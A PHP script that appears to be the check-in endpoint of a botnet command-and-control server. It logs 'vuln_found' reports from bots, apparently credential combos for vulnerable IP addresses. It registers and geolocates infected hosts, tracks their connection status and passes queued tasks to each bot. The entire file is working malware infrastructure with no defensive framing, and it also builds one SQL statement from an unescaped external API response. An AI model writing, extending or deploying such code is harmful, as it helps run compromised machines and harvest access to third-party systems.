<?php
	header("content-type:text/html;charset=utf-8");
	$data = $_GET;
	include "config/config.php";
	$dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	$timezone  = 1;
	$date = gmdate("Y-m-d H:i:s", time() + 3600*($timezone+date("I")));

	// check if vuln ip are found
	if (isset($data["vuln_found"]))
	{
		$statement = $dbConnection->prepare("INSERT INTO `vuln_found` (`combo`, `ip`, `date`) VALUES (:combo, :ip, :date)");
		$statement->bindValue(":combo", $data["vuln_found"]);
		$statement->bindValue(":ip", $ip);
		$statement->bindValue(":date", $date);
		$statement->execute();
	}
	else if (isset($data["id"]))
	{
		// check if exists
		$statement = $dbConnection->prepare("SELECT * FROM `hosts` WHERE `hostname` = :hostname");
		$statement->bindValue(":hostname", $data["id"]);
		$statement->execute();
		$rowCount = $statement->rowCount();
		if ($rowCount == 0) // add bot to list
		{
			$url = "http://ip-api.com/json/". $ip;
			$my_var = file_get_contents($url);
			$obj = json_decode($my_var);
			$latitude = $obj->{'lat'};
			$longitude = $obj->{'lon'};
			$position = $latitude. ", ". $longitude;
			$statement = $dbConnection->prepare("INSERT INTO `hosts` (`hostname`, `ip`, `date`, `date-create`, `status`, `geoloc`) VALUES (:hostname, :ip, :date, :date, 'connected', '". $position ."')");
			$statement->bindValue(":hostname", $data["id"]);
			$statement->bindValue(":ip", $ip);
			$statement->bindValue(":date", $date);
			$statement->execute();
			
		}
		else // update bot status
		{
			$statement = $dbConnection->prepare("UPDATE `hosts` SET `date` = :date, `status` = 'connected', `ip` = :ip WHERE `hostname` = :hostname");
			$statement->bindValue(":hostname", $data["id"]);
			$statement->bindValue(":date", $date);
			$statement->bindValue(":ip", $ip);
			$statement->execute();
		}
		// check if jobs found
		$statement = $dbConnection->prepare("SELECT * FROM `tasks` WHERE `hostname` = :hostname");
		$statement->bindValue(":hostname", $data["id"]);
		$statement->execute();
		$rowCount = $statement->rowCount();
		$results = $statement->fetchAll();
		if ($rowCount != 0)
		{
			foreach ($results as $row) 
			{
				$row_explodes = explode(":", $row["secondary"]);
				echo "api-".$row["action"] ;
				foreach ($row_explodes as $row_explode)
					echo "|" . $row_explode;
				echo "-api";
				$statement = $dbConnection->prepare("DELETE FROM `tasks` WHERE `id` = :id");
				$statement->bindValue(":id", $row["id"]);
				$statement->execute();
				header('Location: /'); 
				exit(0);
			}
		}
	}
	header('Location: /'); 
?>
